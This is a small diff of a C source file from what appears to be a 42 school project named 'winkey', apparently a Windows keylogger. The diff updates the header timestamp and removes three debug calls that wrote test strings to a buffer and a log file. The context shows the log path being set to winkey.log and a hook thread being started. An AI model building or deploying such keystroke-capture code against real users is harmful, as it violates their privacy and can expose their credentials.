@@ -6,7 +6,7 @@
 /*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/05/08 13:00:34 by vzurera-          #+#    #+#             */
-/*   Updated: 2025/05/15 18:32:19 by vzurera-         ###   ########.fr       */
+/*   Updated: 2025/05/18 11:14:06 by vzurera-         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -59,10 +59,6 @@
 		if (!GetModuleFileName(NULL, g_LogPath, MAX_PATH) || !(lastSlash = strrchr(g_LogPath, '\\')))
 			strcpy_s(g_LogPath, MAX_PATH, "c:\\winkey.log");
 		else strcpy_s(lastSlash + 1, g_LogPath + MAX_PATH - (lastSlash + 1), "winkey.log");
-
-		TitleToBuffer("Hola caracola");
-		KeyToBuffer("adios");
-		LogToFile();
 
 		CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
 
